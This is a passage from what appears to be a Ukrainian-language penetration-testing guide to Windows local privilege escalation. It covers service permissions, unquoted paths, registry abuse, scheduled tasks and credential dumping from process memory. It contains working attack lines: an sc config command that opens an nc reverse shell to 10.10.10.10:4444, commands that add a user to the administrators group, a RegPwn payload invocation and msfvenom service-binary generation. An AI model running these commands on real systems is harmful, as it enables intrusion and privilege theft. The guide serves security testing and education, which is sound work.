privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, які ввійшли в систему / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримання вмісту буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Перш за все, під час перегляду списку процесів **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати запущений бінарний файл** або чи маєте права на запис у папку з бінарним файлом, щоб скористатися можливими [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи запущені [**electron/cef/chromium debuggers**; їх можна використати для підвищення привілеїв](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener може працювати недовго, тому його відсутність в одному пасивному знімку портів не доводить, що він ніколи не був доступний. Пов’язуйте кожен виявлений listener із його PID, власником процесу та можливістю користувача з нижчими привілеями до нього під’єднатися; сама лише назва застосунку чи debug-прапорець не підтверджують можливість виконання коду між користувачами. Під час звичайного переліку залишайтеся пасивними й не надсилайте команди debugger.

**Перевірка дозволів на бінарні файли процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів папок із бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги dynamic preprocessor Snort

Snort 2 може завантажувати shared libraries із `dynamicpreprocessor directory`, оголошеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Для scheduled task або service, що запускає Snort під іншим обліковим записом, перевірте саме цю конфігурацію та ACL оголошеного каталогу модулів. Якщо ваш token дає змогу створювати там файли, цей шлях варто перевірити на можливість code execution, коли ця задача або service наступного разу завантажуватиме модулі. Перевірте ефективні privileges облікового запису, від імені якого запускається service, активну конфігурацію, сумісність модулів, а також будь-які обмеження deny або share; сам факт можливості запису в каталог не доводить можливість підвищення привілеїв. У [документації Snort щодо dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована веб-служба з доступним для запису кореневим каталогом документів

В інсталяції Apache на Windows порівняйте шлях до виконуваного файлу service і обліковий запис, від імені якого вона запускається, зі значенням `DocumentRoot` в активному `httpd.conf`. Для типової інсталяції XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто це `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, code execution на боці сервера може перетнути межу привілеїв хоста. Переконайтеся, що service запущена, що саме цей шлях обслуговується і що обробник на боці сервера обробляє цей тип файлів; можливість запису в кореневий каталог сама по собі доводить лише можливість створювати файли. Перевірте ACL, не записуючи пробний файл:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартного встановлення WAMP служба може вказувати на версійний `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація розташовуватися поруч у `conf\httpd.conf`, а кореневий каталог за замовчуванням — бути `C:\wamp64\www` або `C:\wamp\www`. Перевірте точний образ служби, обліковий запис, від імені якого вона запускається, фактичний `DocumentRoot` (зокрема розгортання `${INSTALL_DIR}` і перевизначення віртуальних хостів) і ACL кореневого каталогу. Можливість запису до каталогу WAMP не доводить, що Apache працює як `SYSTEM` або виконує надісланий файл. [В документації Apache пояснено, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте доступний для запису фізичний каталог з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований для нього пул і обробник на сервері. Код у каталозі, який обслуговується, запускається від імені пулу лише за умови, що IIS обробляє цей тип файлів і до відповідного маршруту можна звернутися. Перш ніж вважати доступний для запису каталог засобом виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту під час виконання, обробник і перевизначення для конкретного шляху.

Динамічна компіляція ASP.NET створює окремий шлях, який варто перевірити: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідному каталозі встановлення .NET Framework, але параметр `<compilation tempDirectory>` застосунку може змінити його. [Microsoft описує розташування та підкаталоги для окремих застосунків](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен із нижчими привілеями дає змогу змінювати згенерований код у кеші **конкретного** застосунку, з’ясуйте, чи компілює цей застосунок його повторно від імені привілейованішої [ідентичності робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі по собі ACL файлу чи каталогу не доводять можливість виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом повторної компіляції. Під час переліку даних обмежтеся переглядом метаданих у режимі лише читання; не запускайте компіляцію та не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується на ресурсах домену як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низькі привілеї. `LocalSystem` уже має високі локальні привілеї та також використовує в мережі обліковий запис комп’ютера; `LocalService` зазвичай використовує анонімні мережеві облікові дані. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft описує ці типи ідентичностей](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеву ідентичність пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть застосовуватися значення пулу за замовчуванням, які відрізняються залежно від версії IIS. Тому визначайте ефективну конфігурацію, а не робіть припущення за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, перевірте права доступу до каталогу **саме цього комп’ютера**. Для [DCSync](../active-directory-methodology/dcsync.md) потрібні права реплікації в контексті іменування домену; квиток облікового запису комп’ютера чи роль хоста самі по собі їх не доводять. Під час пасивного переліку перевіряйте конфігурацію та ACL, не завантажуючи файли, не автентифікуючись у мережі та не запитуючи квитки.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте шлях будь-якого значення, отриманого із запиту: автентифікацію, розшифрування, перевірку та формування команди. Обробник, який об’єднує декодований токен у `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft описує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Встановіть, що ненадійний викликач справді може впливати на декодоване значення та звертатися до обробника, а потім визначте ефективну ідентичність пулу застосунків або імперсоновану ідентичність і ідентичність дочірнього процесу. Рядок у вихідному коді, прослуховувач localhost чи слабкість формату токена окремо не доводять можливість привілейованого виконання команд. Переглядайте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного переліку.

Для служби PHP у Windows шлях, контрольований запитом і переданий у [`include` або `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файлу, доступного для запису користувачеві з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може дійти до цього виразу, визначений шлях веде до файлу, який користувач із нижчими привілеями може змінювати, а робочий процес — читати, що обмеження шляхів PHP дозволяють включення та що робочий процес справді має вищі привілеї. Прослуховувач loopback або файл, доступний для запису, самі по собі не підтверджують цей ланцюжок; під час пасивного переліку перевірте вихідний код, ідентичність служби та ACL файлів, не викликаючи кінцеву точку.

### Збирання паролів із пам’яті

За допомогою **procdump** із sysinternals можна створити дамп пам’яті запущеного процесу. Служби на кшталт FTP зберігають **облікові дані у відкритому вигляді в пам’яті**. Спробуйте створити дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Незахищені GUI-програми

**Програми, що працюють як SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: "Windows Help and Support" (Windows + F1): знайдіть "command prompt" і натисніть "Click to open Command Prompt"

### Імпорт файлів проєктів із підвищеними привілеями

Програма, яка автоматично відкриває проєкти з каталогу для завантаження, доступного для запису користувачам із нижчими привілеями, перетинає межу довіри до вхідних даних під обліковим записом імпортера. Перевірте **точний шлях із правами на запис**, процес або завдання, яке його відкриває, його фактичну ідентичність і версію парсера. [Історична проблема Ghidra з відкриттям/відновленням проєктів](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяла [політика вихідних SMB-з’єднань і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це зачіпка щодо витоку облікових даних, а не безпосереднього доступу адміністратора: отримані дані мають бути придатними для використання через окремий дозволений або вразливий шлях, а актуальні збірки слід перевіряти з огляду на фактичний стан виправлень. Не відкривайте спеціально створений проєкт під час пасивного перерахування; перевірте процес імпорту й ACL.

## Services

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об’єкта Service Control Manager (SCM) не пов’язане з правами на наявну службу. Успішний запит лише на читання [`OpenSCManager` щодо доступу](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) із цим правом є приводом для перевірки, а не доказом того, що нову службу можна запустити. [`CreateService` повертає дескриптор](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби пізніше виконує окрему перевірку доступу й може завершитися невдачею, навіть якщо початковий дескриптор можна було використати. Окремо перевірте фактичний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску й шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивного перерахування.

Для віддаленого встановлення служби зіставте ці права SCM із мережевою папкою на цільовій системі, доступною для запису **для того самого мережевого входу**, її базовим ACL NTFS і локальним шляхом до виконуваного файла, який може запускати обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо наявні незвично широкі права SCM і шлях для розміщення файла; адміністративна мережева папка не є обов’язковою умовою. Сам по собі доступ до мережевої папки для запису або окрема зачіпка щодо створення служби через SCM не доводять, що нову службу можна запустити з вищими привілеями.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, завершення роботи або іншої події життєвого циклу, навіть якщо такого файла немає в її `ImagePath`. Якщо ім’я допоміжного файла розв’язується в каталог, доступний для запису користувачам із нижчими привілеями, а служба працює з вищими привілеями, відсутній файл може бути кандидатом на умовну підміну. Підтвердьте **фактичний код служби або задокументований виклик допоміжного файла**, кінцевий шлях до виконуваного файла й порядок пошуку, права на створення файлів у каталозі, ідентичність служби та наявність доступного тригера життєвого циклу. Самі по собі каталог служби з правами на запис або відсутній файл не доводять, що служба завантажить цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби [`SERVICE_START` дозволяє передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або її задокументований інтерфейс. Якщо служба використовує аргумент, який вибирає викликач, як шлях до журналу або експорту, перевірте ідентичність служби, точний зв’язок між аргументом і записом, обмеження шляхів та дозволи на **створений файл**. Запис у захищений каталог може призвести до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самі по собі доступний для запису журнал або право запуску недостатні. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ доступний для читання `nsclient.ini` є **приводом перевірити конфігурацію**: у ньому можуть міститися облікові дані вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, політику доступу й вебслухач, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для виконання з підвищеними привілеями додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), фактичне право реєструвати або змінювати команду та тригер, який запускає її з ідентичністю служби. Слухач, доступний лише через loopback, усе одно може бути доступний локальному користувачу, але самі по собі шлях до файла, пароль або слухач не доводять наявність цих прав. Під час пасивного перерахування перевіряйте метадані й дозволи, не показуючи секрети й не викликаючи веб API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебінтерфейсу й скриптів](https://nsclient.org/docs/setup/securing/) та [налаштування зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби й значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає там дочірню програму](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` задає її робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківських каталогів. Локальна кінцева точка WCF або SOAP, відкрита цією дочірньою програмою, є окремою зачіпкою для перевірки: підтвердьте, що вона доступна користувачу з нижчими привілеями, конкретна операція приймає його дані, а дочірня програма служби виконує небезпечну операцію з вищими привілеями. Самі по собі обліковий запис служби, URL кінцевої точки або шлях із правами на запис не доводять можливість підвищення привілеїв; під час пасивного перерахування не викликайте операції служби.

Для власної операції WCF простежте, чи потрапляє керований викликачем рядок до будь-якого середовища виконання PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає конвеєр](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними транспортного рівня Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але право викликати **саме цю** операцію та фактичну ідентичність середовища виконання потрібно перевіряти окремо. Шлях від даних, наданих викликачем із нижчими привілеями, до `AddScript`, що виконується з ідентичністю служби з вищими привілеями, є межею виконання коду; самі по собі порт, що прослуховується, автентифікований клієнт або невикористовуваний метод у сторонній збірці нічого не доводять. Статично перевірте розгорнуту службу, контракт, авторизацію та параметри імперсонації, не викликаючи кінцеву точку під час перерахування.

Service Triggers дають змогу Windows запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, спрацьовуючи їхні тригери. Методи перерахування й активації наведено тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

До інсталяцій Visual Studio з інструментами C/C++ може входити `VSStandardCollectorService150` — діагностична служба, налаштована для роботи як `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) для перенаправлення скидання DACL служби застосовувалась гонка з junction і посиланням object manager. Для продемонстрованого підвищення привілеїв також був потрібен придатний шлях відновлення MSI через Visual Studio Setup WMI Provider і цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивного первинного аналізу перевірте обліковий запис і шлях до бінарного файла саме цієї служби, з’ясуйте, чи існує шлях до компілятора Setup WMI, і перевірте стан виправлення встановленого компонента. Запис служби, версія продукту Visual Studio або сам файл компілятора не доводять, що хост уразливий. Перевірка не потребує запуску служби або виконання відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

За допомогою **sc** можна отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевіряти необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ви можете завантажити accesschk.exe для XP звідси](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо у вас виникла ця помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Не вдалося запустити службу: її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Ви можете ввімкнути її за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Враховуйте, що для роботи служби upnphost потрібна служба SSDPSRV (у XP SP1)**

**Ще один спосіб обійти** цю проблему — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до бінарного файлу служби**

Якщо група «Автентифіковані користувачі» має дозвіл **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити та виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапустити службу

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити за допомогою різних дозволів:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштовувати виконуваний файл служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися модулем _exploit/windows/local/service_permissions_.

### Слабкі дозволи на виконувані файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, службу часто можна перехопити, **замінивши виконуваний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити виконуваний файл, який запускає служба**, або чи маєте ви **дозволи на запис до папки, де розташований цей файл** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати список усіх виконуваних файлів, які запускаються службами, за допомогою **wmic** (не в system32) і перевірити свої дозволи за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Перевірте наявність небезпечних ACL, наданих **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файла служби чи каталогу, у якому він міститься. Практичний сценарій зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файла за допомогою `sc qc <service_name>`.
2. Перевірте, чи доступний бінарний файл для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або дійсний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи спрацювання тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачеві перезапускати її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію в разі збою, яка повторно запускає її, або чи може застосунок, що її використовує, опосередковано запускати її.

### Дозволи на зміну розділів реєстру служб

Перевірте, чи можете ви змінювати розділи реєстру служб.\
Ви можете **перевірити** свої **дозволи** для **розділу реєстру** служби за допомогою:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** права на запис до ключа реєстру певної служби. Сам запис ACL не доводить наявність ефективного доступу: важливі записи заборони, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для підвищення привілеїв також потрібні придатне для зміни поле конфігурації служби, спосіб запустити службу та ідентифікатор служби з вищими привілеями. Див. [права доступу до ключів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) від Microsoft і [довідник щодо прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити Path виконуваного бінарного файла:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка символьного посилання в реєстрі для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для кожного користувача, які згодом копіюються процесом **SYSTEM** до ключа сеансу HKLM. Гонка із **символьним посиланням** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив для довільного **запису значення** HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить перелік установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему/переходів до secure-desktop і доступний користувачу для запису.

Сценарій зловживання (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке потрібно записати від імені SYSTEM.
2. Запустіть копіювання secure-desktop (наприклад, за допомогою **LockWorkstation**), що запускає потік брокера AT.
3. **Виграйте гонку**: установіть **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **посилання реєстру** на захищений цільовий об’єкт HKLM.
4. SYSTEM запише вибране зловмисником значення за перенаправленим шляхом HKLM.

Отримавши можливість довільно записувати значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служби:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запустити звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** загальнодоступна реалізація експлойта **блокує робочу станцію** в межах гонки.

Приклад інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл для розділу реєстру, це означає, що **ви можете створювати підрозділи реєстру в ньому**. Для служб Windows цього **достатньо, щоб виконати довільний код:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи до служб без лапок

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожну частину шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб, не взяті в лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які потрібно виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на бінарний файл. Якщо цей бінарний файл можна замінити, можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного файлового аргументу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований batch-файл містить прямий виклик PowerShell `-File`, також перевірте ACL зазначеного скрипту; змінні, умовні конструкції та ланцюжки команд потрібно відстежувати вручну. Можливість запису скрипту або батьківського каталогу для поточного користувача свідчить про потенційну можливість виконання в контексті іншого облікового запису лише тоді, коли налаштований principal завдання відрізняється від поточного користувача й завдання справді доходить до цієї дії. ACL, що дозволяє лише додавання даних, може мати значення для скриптів, але попередній `exit` або інша логіка керування потоком може зробити додані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте ефективні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику керування програмами. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

